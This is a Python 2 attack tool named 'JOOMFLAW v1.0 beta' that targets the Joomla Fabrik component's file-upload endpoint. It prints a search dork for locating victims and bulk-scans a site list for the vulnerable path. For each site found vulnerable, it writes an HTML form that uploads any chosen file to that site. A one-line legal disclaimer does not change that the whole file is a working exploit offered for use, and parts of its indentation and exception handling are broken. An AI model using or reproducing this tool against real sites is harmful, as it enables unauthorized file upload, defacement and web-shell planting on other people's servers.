#!/bin/env python2

# Script owner="Fl@w_Er"

# Created on date 25/01/2019

# Modified on date 26/01/2019

# Our Facebook page is http://www.facebook.com/flaw57

# please send all bugs found in beta release to my page

# Acknowledge my Skills

#


import os

import sys

import time

import urllib2


def cls():

	if sys.platform == 'linux2':

		os.system("clear")

	else:

		os.system("cls")


#vulnerability scanner


def scanner():


 if os.path.exists(web):

	pass

 else:

	print ''

	print '\033[1;39m[!] \033[1;31mFile does not exists\033[1;39m'

	print ''

	return

 fi1 = open(web, "r")

 fi2 = fi1.readlines()

 fi1.close()


 for site in fi2:

 	site = site.rstrip()

	pooja = 0

	while pooja <= len(site):

		pooja = pooja+1

		if pooja == len(site):

		 zz = pooja-1

		 if site[zz:pooja] == "/":

			neww = list(site)

			neww.pop()

			xx = "".join(neww)

			site = xx

	darsh = site + payload

	try:

         try:

	 try:

           ajay = urllib2.urlopen(darsh).read()

	 except urllib2.HTTPError:

		 pass

	 except urllib2.URLError:

		pass

	 pat = "check.txt"

 	 if os.path.exists(pat):

        	 os.remove(pat)

         try:

 	 check1 = open("check.txt", "w")

 	 check1.write(ajay)

 	 check1.close()

	 except UnboundLocalError:

	 pass

 	 check = open("check.txt" , "r")

 	 check2 = check.read()

 	 check.close()


 	 vuln = open("vul.txt", "r")

 	 vu = vuln.read()

 	 vuln.close()


	 if check2 != vu:

		 print "\033[1;39m"

		 print site 

		 print check2

		 print "\033[1;31m[-] Site is not vulnerable\033[1;39m"

		 print ''

	 else:

		 print '\033[1;39m'

		 print site

		 print check2

		 print "\033[1;32m[+] Site is vulnerable\033[1;39m"

		 print ''

	except ValueError:

                pass


logo1 = '''

\033[1;33mWARNING :\033[1;39m I am not responsible for any sort of damage caused by the tool. Attacking someone without proper consent is ILLEGAL... 
\033[1;36m

'''

print logo1

print ''

x = raw_input("press enter to START...")


if sys.platform == 'linux2':

	os.system("clear")

else:

	os.system("cls")




logo2 = '''

Coded by FLAW 57

\t JOOMFLAW v1.0 beta

\t Type:

\t  000000    000       000    000    000  0000  55555  7777
\t       0        0      0   0      0  0    00    0  0         5                 /
\t       0        0      0   0      0  0     0     0  000     5555         /
\t  0   0        0      0   0      0  0            0  0                 5      /
\t     0            000       000    0            0  0          5555     /
\t

'''

print logo2

print "\033[1;31mDork :\033[1;39m inurl:/index.php?option=com_fabrik\033[1;39m"

print ""

def hlp():

 help= '''\033[1;39m

\t Commands Description

\t\033[1;31m ======== ===========\033[1;39m

\t

\t -h/help Help

\t set url set url <targeted site>

\t set file set file <filename.txt>

\t clear clear screen

\t scan Site vulnerability sacanner

\t run Creates payload

\t about My self

\t exit Exit the program

\t\033[1;39m

'''

 print help


main = ""

u = "< set url >"

payload = "/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload"

web = ""

while True:

	try:

	 cod = raw_input("\033[1;39mCoder \033[1;32m>>\033[1;32m ")

	 coder = cod.split()

	 if not coder:

                print "<\033[1;31minvalid command\033[1;39m>"

                continue

	 elif coder[0] == "help":

		hlp()

	 elif coder[0] == "scan":

		scanner()

	 elif coder[0] == "about":

		print '\033[1;39m'

		print '\t Name : Fl@w_Er'

		print '\t Country: India'

		print '\t Team: FLAW57 '

		print '\t Link : https://www.facebook.com/flaw57'

		print '\t'


	 elif coder[0] == "-h":

		hlp()

	 elif coder[0] == "exit":

		print "\033[1;39m"

		break

	 elif coder[0] == "set":

		if coder[1] == "url":

		 u = str(coder[2])

		 spu = 0

		 while spu <= len(u):

			spu = spu+1

			if spu == len(u):

			 san = spu-1

			 if u[san:spu] == "/":

				rakesh = list(u)

				rakesh.pop()

				neww = "".join(rakesh)

				u = neww

		elif coder[1] == "file":

		 web = str(coder[2])

		else:

		 print "<\033[1;31minvalid command\033[1;39m>"

		 pass

	 elif coder[0] == "exit":

		break

	 elif coder[0] == "run":

		if u == "":

			print ''

			print "[x] Please provide url"

			print ''

			continue 

		ur = u + payload

		try:

		 try:

		 main = urllib2.urlopen(ur).read()

		 except connection:

		 	pass

		except NameError:

		 print ''

		 print "[!]Ooops!! Test another site if upload fails"

		 print ''

		 pass

		pat = "check.txt"

		if os.path.exists(pat):

			os.remove(pat)


		check1 = open("check.txt", "w")

		check1.write(main)

		check1.close()


		check = open("check.txt" , "r")

		check2 = check.read()

		check.close()


		vuln = open("vul.txt", "r")

		vu = vuln.read()

		vuln.close()


		print ''

		print check2


		if check2 != vu:

			print "\033[1;31m[-] Site is not vulnerable\033[1;39m"

			print ''

		else:

			print "[+] Site is vulnerable"

			flaw = "payload/index.html"


			if os.path.exists(flaw):

				os.remove(flaw)


			expl = open("payload/index.html" , "w")

			expl.write("<html><head> \n")

			expl.write("<title>JoomF57</title> \n")

			expl.write('</head><body background=""> \n')

			expl.write('<link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Amaranth"> \n')

			expl.write('<style> \n')

			expl.write(' body { \n')

			expl.write(' font-family:Amaranth; \n ')

			expl.write(' } \n')

			expl.write('</style> \n')

			expl.write('<center><br><br><br><br><br><br><br><br><br><br> \n')

			expl.write('<h1 style="color:red;">J00MF57 by Flaw57</h1> \n')

			expl.write('<form method="POST" action="'+ur+'" enctype="multipart/form-data"> \n')

			expl.write('<input type="file" name="file"><button>Exploit</button> \n')

			expl.write('</form> \n')

			expl.write('</<center></body></html> \n')

			expl.close()


			print ''


			bairamma = open("payload/index.html" , "r")

			boothappa = bairamma.read()

			bairamma.close()


			print ''

			print "\t\033[1;39m Payload "

			print "\t\033[1;31m ======="

			print ''

			print boothappa

			print ''

			print "\033[1;32mPayload generated in [ payload/index.html ] Thank You\033[1;39m"

			print ''


	 elif coder[0] == "show":

		if coder[1] == "options":

			print '\033[1;39m'

			print "\t Input Options"

			print '\t\033[1;31m =============\033[1;39m'

			print ""

			print '\t url :\033[1;32m ',u

			print '\033[1;39m'

		else:

			print "<\033[1;31minvalid command\033[1;39m>"

			pass

	 elif coder[0] == "clear":

		cls()

	 else:

		print "<\033[1;31minvalid command\033[1;39m>"

		continue

	except IndexError:

	 print "<\033[1;31minvalid command\033[1;39m>"

	 pass

